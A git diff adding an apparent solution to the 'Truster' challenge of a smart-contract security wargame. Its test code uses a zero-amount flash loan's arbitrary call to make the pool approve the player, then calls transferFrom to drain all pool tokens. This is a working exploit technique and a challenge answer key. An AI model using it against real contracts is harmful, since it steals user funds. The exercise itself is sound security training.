@@ -23,6 +23,12 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // const data = ethers.utils.solidityPack("approve(address,uint256)",(player.address,TOKENS_IN_POOL));
+        // let ABI = [signature];
+        let iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+        let data = iface.encodeFunctionData("approve(address,uint256)",[player.address,TOKENS_IN_POOL])
+        await pool.connect(player).flashLoan(0,player.address,token.address,data);
+        await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL);
     });
 
     after(async function () {
